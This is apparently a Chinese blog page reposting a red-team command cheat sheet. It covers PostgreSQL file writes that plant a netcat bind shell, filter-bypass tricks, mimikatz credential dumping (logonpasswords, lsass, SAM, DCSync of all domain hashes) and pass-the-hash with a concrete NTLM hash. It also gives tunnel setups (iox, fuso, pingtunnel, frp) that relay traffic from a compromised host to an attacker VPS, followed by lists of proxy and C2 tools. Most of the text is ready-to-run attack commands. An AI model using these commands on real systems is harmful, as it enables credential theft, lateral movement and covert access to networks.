<h3 id="PostgreSQL-文件写入"><a href="#PostgreSQL-文件写入" class="headerlink" title="PostgreSQL 文件写入"></a>PostgreSQL 文件写入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE pentestlab (t TEXT);</span><br><span class="line">INSERT INTO pentestlab(t) VALUES(&#x27;nc -lvvp 2346 -e /bin/bash&#x27;);</span><br><span class="line">SELECT * FROM pentestlab;</span><br><span class="line">COPY pentestlab(t) TO &#x27;/tmp/pentestlab&#x27;;</span><br></pre></td></tr></table></figure>

<h3 id="绕过过滤器"><a href="#绕过过滤器" class="headerlink" title="绕过过滤器"></a>绕过过滤器</h3><p>引号</p>
<p>使用 CHR</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CHR(65)||CHR(66)||CHR(67);</span><br></pre></td></tr></table></figure>

<p>使用 $ 符号（适用于 PostgreSQL 8及以上版本）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT $$This is a string$$</span><br><span class="line">SELECT $TAG$This is another string$TAG$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：大部分内容翻译至：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdz">https://github.com/swisskyrepo/PayloadsAllTheThings</a></p>
</blockquote>
<h2 id="工具使用命令速查"><a href="#工具使用命令速查" class="headerlink" title="工具使用命令速查"></a>工具使用命令速查</h2><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><p>官方 Github：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a></p>
<h3 id="获取登录凭证信息"><a href="#获取登录凭证信息" class="headerlink" title="获取登录凭证信息"></a>获取登录凭证信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<h3 id="lsass-exe-导出凭据"><a href="#lsass-exe-导出凭据" class="headerlink" title="lsass.exe 导出凭据"></a>lsass.exe 导出凭据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>

<h3 id="mimikatz-PTH-传递-cmd"><a href="#mimikatz-PTH-传递-cmd" class="headerlink" title="mimikatz PTH 传递 cmd"></a>mimikatz PTH 传递 cmd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:cmd.exe&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<h3 id="mimikatz-PTH-传递-mstsc"><a href="#mimikatz-PTH-传递-mstsc" class="headerlink" title="mimikatz PTH 传递 mstsc"></a>mimikatz PTH 传递 mstsc</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot;  &quot;sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 /run:mstsc.exe /restrictedadmin&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:WIN-9UUCAGH32BT /ntlm:f33dfac0370b09935d0037d8333caf25 &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure>

<h3 id="SAM-数据库导出凭据"><a href="#SAM-数据库导出凭据" class="headerlink" title="SAM 数据库导出凭据"></a>SAM 数据库导出凭据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;log&quot; &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot;  &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<h3 id="bat-脚本获取凭据"><a href="#bat-脚本获取凭据" class="headerlink" title="bat 脚本获取凭据"></a>bat 脚本获取凭据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">cd /d D:\tools\</span><br><span class="line">mimikatz.exe privilege::debug sekurlsa::logonpasswords exit &gt; C:\windows\temp\log.txt</span><br></pre></td></tr></table></figure>

<h3 id="导出域内所有用户hash"><a href="#导出域内所有用户hash" class="headerlink" title="导出域内所有用户hash"></a>导出域内所有用户hash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:test.com /all /csv&quot; exit</span><br></pre></td></tr></table></figure>

<h2 id="proxy-tools"><a href="#proxy-tools" class="headerlink" title="proxy tools"></a>proxy tools</h2><h3 id="iox"><a href="#iox" class="headerlink" title="iox"></a>iox</h3><p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/EddieIvan01/iox">https://github.com/EddieIvan01/iox</a></p>
<h4 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h4><blockquote>
<p>在本地 0.0.0.0:1080启动Socks5服务</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./iox proxy -l 1080</span><br></pre></td></tr></table></figure>

<blockquote>
<p>加密转发 socks5 代理：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VPS 监听(//将1080端口监听到的流量转发至50054端口):</span><br><span class="line">nohup ./iox proxy -l 50054 -l 1081 -k 3211 &gt; iox.log &amp;  </span><br><span class="line"></span><br><span class="line">在目标主机执行(//启动代理服务并发送至VPS 50054端口)：</span><br><span class="line">./iox proxy -r VPSIP:50054 -k 3211  </span><br><span class="line"></span><br><span class="line">然后本地socks5代理：socks5://vps:1081</span><br></pre></td></tr></table></figure>

<h4 id="fwd"><a href="#fwd" class="headerlink" title="fwd"></a>fwd</h4><blockquote>
<p>本地端口转发 3389 至VPS:</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps执行:</span><br><span class="line">nohup ./iox fwd -l *8888 -l 33890 -k 22222</span><br><span class="line"></span><br><span class="line">目标机器执行:</span><br><span class="line">iox.exe fwd -r 192.168.0.1:3389 -r *VPSIP:8888 -k 22222</span><br><span class="line"></span><br><span class="line">随后连接 VPS:33890 即可访问内网 3389</span><br></pre></td></tr></table></figure>

<h3 id="fuso"><a href="#fuso" class="headerlink" title="fuso"></a>fuso</h3><p>Github：<a target="_blank" rel="noopener" href="https://github.com/editso/fuso">https://github.com/editso/fuso</a></p>
<h4 id="socks"><a href="#socks" class="headerlink" title="socks"></a>socks</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS：</span><br><span class="line">./fus</span><br><span class="line"></span><br><span class="line">//被控机</span><br><span class="line">./fuc.exe VPSIP 6722 --socks</span><br></pre></td></tr></table></figure>

<ul>
<li>linux：i686-unknown-linux-musl.zip</li>
<li>windows：x86_64-pc-windows-msvc.zip</li>
</ul>
<h4 id="readme"><a href="#readme" class="headerlink" title="readme"></a>readme</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1. 端口转发</span><br><span class="line">fuc --forward-host xxx.xxx.xxx.xxx --forward-port</span><br><span class="line">   --forward-host: 转发到的地址</span><br><span class="line">   --forward-port: 转发到的端口</span><br><span class="line">   如: 转发流量到内网 10.10.10.4:3389</span><br><span class="line">   &gt; fuc --forward-host 10.10.10.4 --forward-port 3389</span><br><span class="line"></span><br><span class="line">2. socks5:</span><br><span class="line">fuc --socks --su --s5p xxx --s5u xxx</span><br><span class="line">   --su: 可选的, 开启udp转发, </span><br><span class="line">   --s5p: 可选的, 认证密码, 默认不进行密码认证</span><br><span class="line">   --s5u 可选的, 认证账号, 默认账号 anonymous</span><br><span class="line">   --socks: 可选的, 开启socks5代理, 未指定--su的情况下不会转发udp</span><br><span class="line">   如: 开启udp转发与密码认证</span><br><span class="line">   &gt; fuc --socks --su --s5p 123 --s5u socks</span><br><span class="line">   此时, 已开启udp转发,连接密码为 &quot;123&quot;,账号为 &quot;socks&quot;</span><br><span class="line"></span><br><span class="line">3. 指定穿透成功时访问的端口</span><br><span class="line">   fuc -b xxxx</span><br><span class="line">   -b | --visit-bind-port: 可选的, 默认随机分配</span><br><span class="line">   如: 访问外网端口 8888 转发到内网 80</span><br><span class="line">   &gt; fuc --forward-port 80 -b 8888</span><br><span class="line"></span><br><span class="line">4. 桥接模式 注意: 目前不能转发udp</span><br><span class="line">   fuc --bridge-listen xxxx --bridge-port xxx </span><br><span class="line">   --bridge-listen | --bl: 监听地址, 默认 127.0.0.1</span><br><span class="line">   --bridge-port | --bp: 监听端口, 默认不启用桥接</span><br><span class="line">   如: 开始桥接模式,并监听在9999端口, 本机ip地址为: 10.10.10.2</span><br><span class="line">   &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 开启桥接</span><br><span class="line">   &gt; fuc 10.10.10.2 9999 # 建立连接</span><br><span class="line"></span><br><span class="line">   级联: </span><br><span class="line">   &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9999 # 第一级, IP: 10.10.10.2</span><br><span class="line">    &gt; fuc --bridge-listen 0.0.0.0 --bridge-port 9991  10.10.10.2 9999 # 第二级, IP: 10.10.10.3</span><br><span class="line">     &gt; fuc 10.10.10.3 9991 # 最终 </span><br><span class="line"></span><br><span class="line">5. 将连接信息通知到 Telegram 或其他</span><br><span class="line">   fus --observer &quot;program:[arguments]&quot;</span><br><span class="line">   --observer: 建立连接或断开连接时的钩子</span><br><span class="line">   如: 使用bash脚本将连接信息通知到tg</span><br><span class="line">   &gt; fus --observer &quot;/bin/bash:[telegram.sh]&quot;</span><br><span class="line"></span><br><span class="line">6. 指定客户端与服务端通信的端口</span><br><span class="line">   fuc --channel-port 8888 ...</span><br><span class="line">   --channel-port: 可选的, 客户端与服务端通信端口, 默认随机</span><br></pre></td></tr></table></figure>

<h3 id="pingtunnel-frp-搭-icmp-隧道"><a href="#pingtunnel-frp-搭-icmp-隧道" class="headerlink" title="pingtunnel+frp 搭 icmp 隧道"></a>pingtunnel+frp 搭 icmp 隧道</h3><p>pingtunnel 下载：<a target="_blank" rel="noopener" href="https://oss.ywhack.com/%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/pingtunnel-2.6">https://oss.ywhack.com/%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93/pingtunnel-2.6</a></p>
<h4 id="被控机"><a href="#被控机" class="headerlink" title="被控机"></a>被控机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nohup ./pingtunnel -type client -l 127.0.0.1:9999 -s vpsip -t vpsip:10000 -sock5 -1 -noprint 1 -nolog 1 &gt;p.log &amp;</span><br><span class="line">nohup ./frpc -c frpc.ini &gt; fff.log &amp;</span><br></pre></td></tr></table></figure>

<p>pingtunnel -l 监听本地的9999端口 -s vps主机IP -t vps主机frp服务端口</p>
<h4 id="客户端frp配置"><a href="#客户端frp配置" class="headerlink" title="客户端frp配置"></a>客户端frp配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 127.0.0.1</span><br><span class="line">server_port = 10000</span><br><span class="line">token = PassW0Rd</span><br><span class="line"></span><br><span class="line">[zhaoshangju_10078]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10015</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = thIsuserAS</span><br><span class="line">plugin_passwd = Passweqwe0Rm</span><br><span class="line">use_encryption = true</span><br></pre></td></tr></table></figure>

<h4 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server</span><br><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>

<p>本地代理vps的 10015 端口加上密码即可使用icmp隧道。</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/15213394.html">https://www.cnblogs.com/cute-puli/p/15213394.html</a></p>
<h3 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h3><ul>
<li>将 frps 及 frps.ini 放到具有公网 IP 的机器上。</li>
<li>将 frpc 及 frpc.ini 放到处于内网环境的机器上。</li>
<li>客户端：frpc -c frpc.ini</li>
<li>服务端：frps -c frps.ini</li>
</ul>
<p>Github:<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
<h3 id="代理工具列表"><a href="#代理工具列表" class="headerlink" title="代理工具列表"></a>代理工具列表</h3><ul>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly93d3cucHJveGlmaWVyLmNvbS8=">proxifier 全平台代理工具，支持多种socks协议</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==">frp 专注于内网穿透的高性能的反向代理应用</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2VoYW5nLWlvL25wcw==">nps 轻量级、高性能、功能强大的内网穿透代理服务器</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0VkZGllSXZhbjAxL2lveA==">iox 端口转发 &amp; 内网代理工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3BoNG50b25uL1N0b3dhd2F5">Stowaway 面向渗透测试人员的多级代理工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3JhcGl6MS9yYXRob2xl">rathole Rust 编写的安全、稳定、高性能的内网穿透工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2IyM3IwL3Jzb2N4">rsocx 一款高性能的支持绑定&#x2F;反向代理的 Socks5 工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL01vYjIwMDMvcmFrc2hhc2E=">rakshasa 基于go编写的跨平台、稳定、隐秘的多级代理内网穿透工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0ZlbGlzQ2F0dXMvU3dpdGNoeU9tZWdh">SwitchyOmega 浏览器的代理插件</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0wtY29kZXMvTmVvLXJlR2Vvcmc=">Neo-reGeorg 改进的reGeorg版本</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2FsZXgtc2VjdG9yL2RuczJ0Y3A=">dns2tcp是一款利用dns协议传输tcp数据的工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2lhZ294ODYvZG5zY2F0Mg==">dnscat2 是一个DNS隧道工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL25jY2dyb3VwL0FCUFRUUw==">ABPTTS 基于ssl加密的http隧道工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cDovL3Jvb3RraXRlci5jb20vVGVybWl0ZS8=">Termite 内网渗透代理、端口转发工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0ZRcmFiYml0L1NTVGFwLVJ1bGU=">SSTap, 一款利用虚拟网卡在网络层实现的代理工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2lkbGVmaXJlL2V3">ew 用于开启 SOCKS v5 代理服务的工具(跨平台)</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL250b3AvbjJu">n2n 开源的点对点穿透工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0NURi1NaXNzRmVuZy9FY2xvdWQ=">Ecloud 一款基于http&#x2F;1.1协议传输TCP流量的工具</a></li>
<li>[2021.03.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2lucXVpc2IvaWNtcHNo">icmpsh 一个简单的 reverse ICMP shell</a></li>
<li>[2021.03.08] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2luY29uc2hyZXZlYWJsZS9uZ3Jvaw==">ngrok 正&#x2F;反向代理，内网穿透，端口转发</a></li>
<li>[2021.03.08] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9zZWN1cmVzb2NrZXRmdW5uZWxpbmcuZ2l0aHViLmlvL3NzZi8=">ssf 全平台的加密隧道 端口转发工具</a></li>
<li>[2021.03.14] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2hhYWQvcHJveHljaGFpbnM=">proxychains 命令行代理神器</a></li>
<li>[2021.03.14] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2NyYWJrdW4vc3dpdGNoZXI=">switcher 一个多功能的端口转发&#x2F;端口复用工具</a></li>
<li>[2021.03.22] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2VzcnJocy9waW5ndHVubmVs">pingtunnel 是把 tcp&#x2F;udp&#x2F;sock5 流量伪装成 icmp 流量进行转发的工具</a></li>
<li>[2021.03.26] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2pwaWxsb3JhL2NoaXNlbA==">chisel – 一款快速稳定的隧道工具</a></li>
<li>[2021.03.29] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0Z1bm55V29sZi9weXN0aW5nZXI=">pystinger – 一款使用webshell进行流量转发的出网工具</a></li>
<li>[2021.03.29] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2JsYWNrYXJyb3dzZWMvcGl2b3RuYWNjaQ==">pivotnacci – 通过HTTP代理建立socks连接的工具</a></li>
<li>[2021.04.06] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2ZmYXkvbGFucHJveHk=">lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具</a></li>
<li>[2021.04.14] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0RsaXYzL1Zlbm9t">Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</a></li>
<li>[2021.05.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3NuYWlsMDA3L2dvcHJveHk=">goproxy 一款轻量级、功能强大、高性能的多种代理工具</a></li>
<li>[2021.05.07] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3NoaW1tZXJpcy9TQ0ZQcm94eQ==">SCFProxy 一个基于腾讯云函数服务的免费代理池</a></li>
<li>[2021.06.21] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL21vc24vbW9zbg==">MOSN 是边缘或服务网格的云原生代理。</a></li>
<li>[2021.06.23] – <a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0RheWJyNGFrL0MyUmV2ZXJzZVByb3h5">C2ReverseProxy 一款可以在不出网的环境下进行反向代理及cs上线的工具</a></li>
</ul>
<h2 id="后渗透工具列表"><a href="#后渗透工具列表" class="headerlink" title="后渗透工具列表"></a>后渗透工具列表</h2><h3 id="f8x"><a href="#f8x" class="headerlink" title="f8x"></a>f8x</h3><blockquote>
<p>一款红&#x2F;蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等</p>
</blockquote>
<ul>
<li>项目地址：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2ZmZmZmZmZmMHgvZjh4">https://github.com/ffffffff0x/f8x</a></li>
<li>中文文档：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2ZmZmZmZmZmMHgvZjh4L2Jsb2IvbWFpbi9SRUFETUUuemgtY24ubWQ=">https://github.com/ffffffff0x/f8x/blob/main/README.zh-cn.md</a></li>
</ul>
<h3 id="Supershell"><a href="#Supershell" class="headerlink" title="Supershell"></a>Supershell</h3><blockquote>
<p>Supershell C2 远控平台，基于反向SSH隧道获取完全交互式Shell</p>
</blockquote>
<ul>
<li>项目地址：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL3RkcmFnb242L1N1cGVyc2hlbGw=">https://github.com/tdragon6/Supershell</a></li>
</ul>
<h3 id="Viper"><a href="#Viper" class="headerlink" title="Viper"></a>Viper</h3><blockquote>
<p>互联网攻击面管理&amp;红队模拟平台</p>
</blockquote>
<ul>
<li>项目地址：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0Z1bm55V29sZi9WaXBlcg==">https://github.com/FunnyWolf/Viper</a></li>
<li>安装 or 使用手册：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly93d3cueXVxdWUuY29tL3ZpcGVyc2VjL2luc3RhbGwvb2xnMXVh">https://www.yuque.com/vipersec/install/olg1ua</a></li>
</ul>
<h3 id="Sliver-C2"><a href="#Sliver-C2" class="headerlink" title="Sliver C2"></a>Sliver C2</h3><blockquote>
<p>Sliver C2 是一个开源的跨平台红队框架。</p>
</blockquote>
<ul>
<li>项目地址：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL0Jpc2hvcEZveC9zbGl2ZXI=">https://github.com/BishopFox/sliver</a></li>
<li><a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzIyNDM=">红队工具研究篇 – Sliver C2</a></li>
</ul>
<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><blockquote>
<p>内网渗透 Python 工具包</p>
</blockquote>
<ul>
<li>项目地址：<a target="_blank" rel="noopener" href="http://doc.vulexp.cn/?golink=aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==">https://github.com/fortra/impacket</a></li>
</ul>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/10/18/652ec6e6bfd3a.gif" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/10/18/652ec6e6bfd3a.gif" title="头像" alt="头像"></a><div class="post-copyright__author_name">Explangcn</div><div class="post-copyright__author_desc">形而上学 学而后思</div></div><div class="post-copyright__post__info"><a class="post-copyright__reprint" title="该文章为转载文章，注意版权协议" target="_blank" rel="noopener" href="https://doc.vulexp.cn">转载</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('https://doc.vulexp.cn')">红队命令速查-洞查文库</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="https://doc.vulexp.cn"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=红队命令速查-洞查文库&amp;url=https://doc.vulexp.cn&amp;pic=https://www.dmoe.cc/random.php?_r_=81f1a3c5-8dad-760e-8945-1fc4ba6212fa" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
